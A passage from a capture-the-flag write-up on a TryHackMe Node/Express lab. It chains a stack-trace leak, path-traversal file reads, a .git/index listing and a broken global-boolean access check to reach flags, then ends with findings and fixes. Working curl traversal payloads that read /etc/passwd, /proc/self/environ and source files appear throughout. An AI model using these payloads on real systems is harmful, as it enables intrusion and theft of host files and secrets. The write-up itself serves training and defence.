    at AsyncResource.runInAsyncScope (node:async_hooks:206:9)
    at invokeCallback (/home/ubuntu/mothers_secret_challenge/node_modules/raw-body/index.js:231:16)
    ...
```

**`/home/ubuntu/mothers_secret_challenge`.** The absolute path to the application.

That is the single most useful request of the whole engagement, and it cost nothing. Worth
generalising, because it applies far beyond this box:

> **When a well-behaved app refuses to leak, attack the middleware, not the handler.** Body parsers,
> validators, session middleware and template engines run *outside* the route's try/catch. A
> `SyntaxError` from `express.json()` bypasses every bit of error handling the developer wrote,
> because they never imagined an error arriving before their code did.

And the underlying misconfiguration is the real finding: **`NODE_ENV` is not set to `production`**, so
Express ships stack traces to anonymous clients.

---

## 4. Exploitation — arbitrary file read

With the application's real path known, `/api/nostromo` started answering:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"file_path":"../../../../etc/passwd"}' http://$IP/api/nostromo
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Same parameter name as `/yaml`, no extension restriction, full arbitrary file read.**

**An honest note about how that happened, because the clean version of this story would be a lie.**
Earlier in this session I sent that *exact* request — `file_path` with `../../../../etc/passwd` — as
part of a 156-request sweep, and every single one came back `Science Officer Eyes Only`. Later,
identical requests returned file contents. I did not find a payload that "unlocked" it; the request
that worked was not cleverer than the one that failed.

Once I had the source (below) I could check: **there is no authorisation check on that route at
all.** `Science Officer Eyes Only` is simply the message it returns whenever `fs.readFile` fails.

My first explanation was that the app had restarted between sweeps. **That turned out to be wrong,
and I could prove it wrong later** — once the read primitive reached `/var/log/syslog`, every log
line from the application carried the same PID:

```
Aug 23 21:57:19 ip-10-128-135-177 node[494]: A user disconnected from /yaml route.
Aug 23 22:11:39 ip-10-128-135-177 node[494]: SyntaxError: Unexpected token '"' ...
```

**`node[494]` throughout.** The process never restarted, and the systemd unit pins
`WorkingDirectory=/home/ubuntu/mothers_secret_challenge`, so the working directory never moved
either. Both of my explanations are dead. The failure remains **observed and unexplained** — most
likely something in my own sweep loop rather than the server, since a later hand-written request
with the identical parameter and value worked first time. I am recording it as an anomaly, not as a
step in the exploit, and not dressing it up with a theory the evidence does not support.

> **The lesson is the one that costs people the most time on lab boxes:** when a payload that
> *should* work does not, the box is a suspect too, not only your payload. Re-test a failed
> hypothesis before you build three new theories on top of its corpse. I built two.

**Reading the source.** `package.json` first, since it names the entry point and the dependencies:

```bash
P=../../../../home/ubuntu/mothers_secret_challenge
curl -s -X POST -H "Content-Type: application/json" \
     -d "{\"file_path\":\"$P/package.json\"}" http://$IP/api/nostromo
```

```json
{
  "name": "mother-secret",
  "main": "server.js",
  "type": "module",
  "dependencies": {
    "compression": "^1.7.4",
    "express": "^4.18.2",
    "js-yaml": "^4.1.0",
    "nodemon": "^2.0.22",
    "socket.io": "^4.7.0"
  }
}
```

Then `server.js`, which lays out the whole app:

```js
app.use(express.static(`${__dirname}/public/`));
app.use(express.json({ limit: "10kb" }));
app.use(compression());

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

attachWebSocket(server);
app.use("/api", routeNostromo);
app.use("/yaml", routeYaml);

app.use("*", (req, res) => {
  res.status(500).json({ status: "You just hit the wrong route." });
});
```

Every mystery from the recon phase is answered in eleven lines. The catch-all is the last
`app.use("*")`. The two routers are `/yaml` and `/api`. And `app.use("/api", routeNostromo)` is why
the paths are asymmetric — the *router* is mounted at `/api`, and it defines `/nostromo` inside
itself, which is why `/yaml` and `/api/nostromo` look inconsistent from outside.

---

## 5. Reading the actual vulnerabilities

**`routes/yaml.js`** — the Alien Loader:

```js
import yaml from "js-yaml";

const isYaml = (filename) => filename.split(".").pop() === "yaml";

export let isYamlAuthenticate = false;

Router.post("/", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;          // <-- string concatenation

  if (!isYaml(filePath)) {
    return res.status(500).json({ status: "error", message: "Not a YAML file path." });
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).json({ status: "error", message: "Failed to read the file." });
    }
    isYamlAuthenticate = true;
    res.status(200).send(yaml.load(data));
    attachWebSocket().of("/yaml").emit("yaml", "YAML data has been processed.");
  });
});
```

Three separate mistakes, and it is worth naming each one:

1. **`./public/${file_path}` is string concatenation, not path resolution.** No `path.join`, no
   `path.resolve`, no check that the result is still inside `public/`. The correct pattern is to
   resolve the joined path and then verify it still starts with the intended base directory —
   `path.resolve` first, compare second. Neither happens.
2. **The only validation is an extension check.** `filename.split(".").pop() === "yaml"` takes
   everything after the last dot. It says nothing about *where* the file is, only what it is called.
   This is why `../../../../etc/netplan/50-cloud-init.yaml` sails through: it ends in `yaml`, so as
   far as `isYaml` is concerned it is fine. Extension checks answer "what kind of file", never
   "which file" — and traversal is a *which* problem.
   
   It is also why `.yml` was rejected: `pop()` returns `yml`, which is not the string `yaml`.
3. **`isYamlAuthenticate` is module-level global state**, flipped to `true` by *anyone's* successful
   request, and never scoped to a user or reset. Remember that — it matters in a moment.

**Is the YAML loader itself exploitable?** This is where a lot of write-ups would claim an RCE that
is not there, so check it against the box rather than against memory. `yaml.load()` in js-yaml **3.x**
used a schema that includes `!!js/function`, and is the classic Node deserialisation RCE. Here:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"file_path\":\"$P/node_modules/js-yaml/package.json\"}" http://$IP/api/nostromo
```

```json
"name": "js-yaml",
"version": "4.1.0",
```

And from the library's own source on this host:

```js
throw new Error('Function yaml.' + from + ' is removed in js-yaml 4. ' +
  'Use yaml.' + to + ' instead, which is now safe by default.');
```

**js-yaml 4.1.0 — `load()` is safe by default**, `!!js/function` is gone from the default schema.
So there is **no deserialisation RCE on this box**, and I did not attempt one. The "Alien Loader"
hint points at the *file read*, not at code execution. Verified, not assumed.

**`routes/nostromo.js`** — the traversal, and a second endpoint the client never mentions:

```js
import { isYamlAuthenticate } from "./yaml.js";
let isNostromoAuthenticate = false;

Router.post("/nostromo", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;          // no extension check at all

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).json({ status: "error", message: "Science Officer Eyes Only" });
    }
    isNostromoAuthenticate = true;
    res.status(200).send(data);
    attachWebSocket().of("/nostromo").emit("nostromo", "Nostromo data has been processed.");
  });
});

Router.post("/nostromo/mother", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./mother/${file_path}`;          // different base directory

  if (!isNostromoAuthenticate || !isYamlAuthenticate) {
    return res.status(500).json({
      status: "Authentication failed",
      message: "Kindly visit nostromo & yaml route first. (not necessarily in that order)",
    });
  }
  fs.readFile(filePath, "utf8", (err, data) => { ... res.status(200).send(data); });
});
```

Now everything resolves:

- `Science Officer Eyes Only` **is not an authorisation message.** It is the `readFile` error
  branch. Every "gate bypass" I attempted for the best part of an hour was chasing a gate that did
  not exist — the route was telling me *"that file does not exist"* in a costume.
- **`/api/nostromo/mother` is the real prize**, it is reachable from nowhere in the client, and its
  base directory is `./mother/` rather than `./public/`.
- Its gate is the two module-level booleans. And they are **global, process-wide, and never reset** —
  so "authentication" here means *anyone, ever, has successfully read a file through each of the
  other two routes*. Both were already `true` from my own earlier requests. It is not access
  control; it is a progress counter.

That is the real vulnerability chain, and it is a good one to be able to name in an exam:

**Path traversal (CWE-22) → sensitive source disclosure → broken access control (CWE-284) via
global mutable state.**

---

## 6. Post-exploitation — collecting the secrets

The `mother` endpoint needed both flags set, which they were:

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"secret.txt"}' http://$IP/api/nostromo/mother
```

```
Secret: /opt/m0th3r
```

No traversal needed for that one — `./mother/secret.txt` is exactly what the route is *for*. It
hands over a filesystem path, which is then read through the unrestricted traversal on the parent
route:

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"../../../../opt/m0th3r"}' http://$IP/api/nostromo
```

```
Classified information.

Secret: Flag{[redacted]}
```

**Flag #2.** Special Order 937 in full: *ensure return of organism, crew expendable.*

---

## 6b. The intended path, found by asking the repo for a directory listing

Everything above got me two flags, but the room's questions ask for things I had not seen —
an "emergency command override" number and a flag "in the Nostromo route". Both existed; my
wordlists simply could not guess their filenames. Here is how I stopped guessing.

**Plan (written before running):** the file-read primitive cannot list a directory —
`fs.readFile` on a directory returns `EISDIR`, which the app renders as the same error as a missing
file. So I need a **file that contains a listing**. Three candidates on a Node box: the shell
history, the process table via `/proc`, and — best of all — a git index.

`/proc` came first because it is free and always there:

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"../../../../proc/self/environ"}' http://$IP/api/nostromo
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"../../../../proc/self/cmdline"}' http://$IP/api/nostromo
```

```
LANG=C.UTF-8 PATH=... HOME=/root LOGNAME=root USER=root SHELL=/bin/sh ...
/home/ubuntu/.nvm/versions/node/v20.5.0/bin/node /home/ubuntu/mothers_secret_challenge/server.js
```

**`USER=root`.** The web application runs as root, confirmed by its unit file:

```
[Service]
ExecStart=/home/ubuntu/.nvm/.../node /home/ubuntu/mothers_secret_challenge/server.js
Restart=on-failure
User=root
WorkingDirectory=/home/ubuntu/mothers_secret_challenge
```

So the arbitrary read is an arbitrary read of **the entire filesystem**, `/root` included. That is a
finding in its own right: nothing about serving a web page needs root, and running as root turns a
traversal bug into a total disclosure of the host.

Then a sweep of the application root turned up the thing that mattered:

```bash
ffuf -u http://$IP/api/nostromo -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"../FUZZ"}' -w /usr/share/wordlists/dirb/common.txt -fs 56 -t 40
```

```
.git/HEAD
```

**A git repository in the application root.** `.git/config` names the origin, and
`.git/logs/HEAD` shows it was cloned and then pulled — but the repo is not public, so that is a dead
end for downloading the source.

`.git/index` is not a dead end. It is git's staging area, and although it is a binary format, **every
tracked file path is stored in it as a plain string**. `strings` recovers the lot:

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"../.git/index"}' http://$IP/api/nostromo | strings -n 4 | grep -v node_modules
```

```
.gitignore
README.md
mother/0rd3r937.txt
mother/index.js
mother/secret.txt
package.json
public/0rd3r937.txt
public/100375.yaml
public/index.min.js
public/style/style.css
routes/nostromo.js
routes/yaml.js
server.js
views/index.html
websocket.js
```

**That is the directory listing the file-read primitive could not give me.** And there they are:
`public/100375.yaml` and `public/0rd3r937.txt` — two filenames that no English wordlist on earth
contains, which is exactly why hours of fuzzing never touched them.

> **Technique worth keeping.** When you have file read but not directory listing, hunt for files that
> *describe* the filesystem: `.git/index`, `.git/logs/HEAD`, `package-lock.json`, `.bash_history`,
> `/proc/self/cmdline`, `/proc/self/environ`, systemd unit files, `/var/log/syslog`. One of them
> usually turns a blind read into a map. A read primitive plus a listing is worth far more than
> either alone.

**Now the intended chain, walked properly.** The "Alien Loader" box wanted this file all along:

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"100375.yaml"}' http://$IP/yaml
```

```
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3r937.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

The **filename is the answer to the first question** — `100375` is MU-TH-UR's emergency command
override — and the contents route you to the next step: the `api/nostromo` endpoint, and the file
to ask it for. This is what the hint meant by *"this loader holds the truths to unveil the hidden
paths"*. Not a metaphor; a literal set of directions.

```bash
curl -s -X POST -H "Content-Type: application/json" \
     -d '{"file_path":"0rd3r937.txt"}' http://$IP/api/nostromo
```

```
                    Mother
FOR SCIENCE OFFICER EYES ONLY
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{[redacted]}
```

**Flag #3** — and note that no traversal is needed for either of these. `100375.yaml` and
`0rd3r937.txt` both sit in `public/`, exactly where the routes expect them. The intended solution is
just *knowing the filenames*, which the YAML file tells you. The traversal is what you need for
everything **beyond** the intended path — the source, `/opt/m0th3r`, `/root`.

Hitting those two routes is also what flips `isYamlAuthenticate` and `isNostromoAuthenticate`, which
is what opens `/api/nostromo/mother`, and what makes the two socket events fire so the browser UI
finally swaps the Role box to **Ash** and the Flag box to `THM_FLAG{[redacted]}`. The whole app is
one intended sequence, and every "gate" in it is a global boolean.

---

## 7. Answers

**The room's questions:**

| Question | Answer | Where it came from |
|---|---|---|
| Number of the emergency command override | `100375` | Filename `public/100375.yaml`, read through `POST /yaml` |
| Special order number | `937` | `SPECIAL ORDER 937` in `0rd3r937.txt`; also encoded in flag #1 |
| Hidden flag in the Nostromo route | `Flag{[redacted]}` | `public/0rd3r937.txt` via `POST /api/nostromo` |
| Name of the Science Officer with permissions | `Ash` | `modifyData()` writes `"Ash"` into the crew badge |
| Contents of the classified "Flag" box | `THM_FLAG{[redacted]}` | base64 `VEhNX0ZMQUd7…fQ==` in `index.min.js` |
| Where is Mother's secret | `/opt/m0th3r` | `./mother/secret.txt` via `POST /api/nostromo/mother` |
| What is Mother's secret | `Flag{[redacted]}` | `/opt/m0th3r` via traversal on `POST /api/nostromo` |

**Every flag on the box:**

| Flag | Location | Reached by |
|---|---|---|
| `THM_FLAG{[redacted]}` | `public/index.min.js` | Reading a static file — no exploitation at all |
| `Flag{[redacted]}` | `public/0rd3r937.txt` (and `mother/0rd3r937.txt`) | `POST /api/nostromo`, intended path |
| `Flag{[redacted]}` | `/opt/m0th3r` | Path traversal, outside the intended path |

**Verified:** every value above was retrieved from the target with the commands shown, and the chain
was re-run end to end afterwards to confirm it reproduces. **Not verified:** nothing was submitted to
TryHackMe from this session, so these are evidence-backed rather than scoreboard-confirmed.

The full attack chain, one line each:

1. Read `index.min.js`, deobfuscate it → two hints, two namespaces, and flag #1 in plain base64.
2. Themed wordlist over POST → `/yaml` and `/api/nostromo`; themed parameter guessing → `file_path`.
3. `/yaml` validates only the extension → traversal to any `.yaml` on the box.
4. Malformed JSON → `express.json()` throws before the route → stack trace → the install path.
5. `/api/nostromo` has no extension check → read the application source.
6. `/proc/self/environ` → the app runs as **root**; `.git/index` → the full file listing.
7. Intended path: `100375.yaml` names the next file → `0rd3r937.txt` → flag #2.
8. Those two reads flip the global booleans → `/api/nostromo/mother` → `secret.txt` → `/opt/m0th3r` → flag #3.

---

## 8. Findings, written the way a report wants them

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | **Path traversal / arbitrary file read** — `POST /api/nostromo`, parameter `file_path`, concatenated into `./public/${file_path}` with no resolution or containment check | Critical | `/etc/passwd`, application source, `/opt/m0th3r` all retrieved |
| 2 | **Path traversal, extension-limited** — `POST /yaml`, same concatenation, guarded only by `filename.split(".").pop() === "yaml"` | High | `/etc/netplan/50-cloud-init.yaml` retrieved |
| 3 | **Broken access control** — `/api/nostromo/mother` gated on two process-global booleans set by any client's successful request | High | Endpoint reached without ever authenticating |
| 4 | **Stack traces exposed to anonymous users** — `NODE_ENV` not set to `production`; malformed JSON reaches Express's default error handler | Medium | Absolute install path disclosed |
| 5 | **Secret embedded in client-side JavaScript** — flag base64-encoded in `index.min.js`, revealed by a browser-side `if` | Medium | Flag #1 recovered from a static file, unauthenticated |
| 6 | **Source disclosure** — full application source, including unreferenced endpoints, readable via finding 1 | High | `server.js`, `routes/*.js`, `websocket.js` retrieved |
| 7 | **Web application runs as `root`** — systemd unit sets `User=root`, so finding 1 reads every file on the host | Critical | `/proc/self/environ` shows `USER=root`; `/root/.bash_history` retrieved |
| 8 | **`.git` directory deployed to the application root** — `.git/index` yields the complete file listing, `.git/config` the origin URL | Medium | Full tracked-file list recovered with `strings` |

**Fixes, in priority order.** For findings 1 and 2, resolve then verify — never concatenate:

```js
import path from "path";

const ROOT = path.resolve("./public");
const target = path.resolve(ROOT, userInput);

// containment check: the resolved path must still be inside ROOT
if (target !== ROOT && !target.startsWith(ROOT + path.sep)) {
  return res.status(400).json({ status: "error", message: "Invalid path." });
}
```

The order matters: `path.resolve` **first**, collapsing every `..`, and the containment check
**second**, on the result. Checking the raw string before resolution is the mistake that encoded
traversal payloads exist to defeat. Keep the extension check if you like, but as a *content-type*
rule on top of containment, never as a substitute for it.

For finding 3, replace global booleans with per-request identity — a signed session or token
evaluated on every request. Any `let` at module scope that means "someone is allowed" is a bug: in a
single-process server it is shared by every visitor at once.

Finding 7 is the multiplier: run the service as an unprivileged user with its own account, and the
same traversal bug stops at whatever that user can read instead of handing over `/root`. Finding 8
is a deployment hygiene problem — deploy from a build artefact, not a working clone, and never ship
`.git`.

For finding 4, set `NODE_ENV=production` and add an error handler that logs the stack server-side
and returns a generic message. For finding 5, secrets belong behind a server-side authorisation
check; shipping one to the browser and hiding it behind an `if` is not a control. Obfuscating the
bundle is not one either — this one took a single `base64 -d`.

---

## 9. What this box is actually teaching

**Wordlists encode assumptions.** `dirb/common.txt` found nothing here, twice, and both times the
fix was the same: build the wordlist from the target's own vocabulary. The routes were `/yaml` and
`/api/nostromo`; the parameter was `file_path`. A generic list contains none of those. On the exam,
when a sweep comes back empty, ask what your wordlist assumed about the developer before you reach
for a bigger one.

**Error messages are an oracle, and they lie about their meaning.** Two distinct strings on `/yaml`
told me exactly where validation ended and I/O began, which is what made blind filesystem probing
possible. But `Science Officer Eyes Only` — which *reads* like an authorisation failure — was
`ENOENT` in costume, and I burned real time attacking a gate that was never there. Read error
strings as evidence of **which code branch ran**, not as statements of fact.

**A read primitive without a listing is half a primitive.** The two files the room actually wanted —
`100375.yaml` and `0rd3r937.txt` — were unguessable by construction, and no amount of fuzzing was
going to reach them. What reached them was `.git/index`, a file that *describes* the filesystem.
When you can read but not list, go looking for the map: `.git/index`, lockfiles, shell history,
`/proc/self/cmdline`, unit files, logs.

**Attack the middleware, not just the handler.** Every route was wrapped in try/catch; the app leaked
its install path through `express.json()`, which runs before any of them.

**Client-side checks are not access control.** `if (authNostromo && authYaml)` guarded a secret the
browser had already downloaded. Server-side, `isYamlAuthenticate` was the same mistake one layer
down — a global flag that any visitor could flip for everyone.

**And re-test a failed hypothesis before building on its failure.** The single biggest time sink here
was a correct request that failed for environmental reasons, which I treated as proof of an
authorisation gate and then spent hundreds of requests trying to bypass. Two failed fixes sharing an
untested premise is the signal to go test the premise — I noticed that pattern once and acted on it,
and missed it the second time.

---

## 10. Teardown and scope — what was left on the box

**Whatever you start, you stop.** This is the last step of any engagement, not an afterthought, and
it belongs in the write-up because "what did you leave behind" is a question a client will ask.

| Started | How it was stopped | Verified? |
|---|---|---|
| **Nothing was written to the target** | no shell uploaded, no key added, no file created, no account registered — every single request was a **read** | **Yes, by construction** |
| Local copy of `index.min.js` and the helper scripts | kept in a scratch directory, outside any repository | Assumed — they are gone, but the manner of their going wasn't recorded |
| `nmap` scans | short-lived; both exited on their own | Yes |
| No `/etc/hosts` entry was ever needed | the box was addressed by IP throughout | Yes |

**This is the cleanest teardown you will see, and the reason is structural rather than virtuous:
the entire attack was a *read primitive*.** Path traversal reads files. It does not write them. So
there was never anything to remove, and no way to accidentally leave a door open for the next
person.

Contrast that with a file-upload box, where getting RCE *means* putting an executable web shell in a
world-reachable directory. There, cleanup is mandatory and easy to get half-right — delete the shell
you remember and forget the second one you uploaded twenty minutes later, and you have handed the
next visitor a working backdoor **plus** whatever credentials that second file happened to contain.

> **Worth internalising as a habit, not a rule you look up:** the moment an exploit changes from
> *reading* to *writing*, you have acquired a cleanup obligation. Start the list at that moment,
> while there is exactly one item on it — not at the end, when you are tired and trying to remember
> what you did an hour ago.

### Scope

All activity was against a single TryHackMe lab machine (`10.128.135.177` on this run; the platform
issues a fresh IP each session) over its VPN. No lateral movement was attempted, no other host was
touched, and the credentials and paths in this document belong to a disposable lab box that no longer
exists.

**Verification status of every value in §7:** all of them were retrieved from the target with the
commands shown, and the whole chain was re-run end to end to confirm it reproduces. **None of them
was submitted to TryHackMe's answer box**, so they are *evidence-backed*, not *platform-confirmed* —
two different claims, and worth keeping apart.
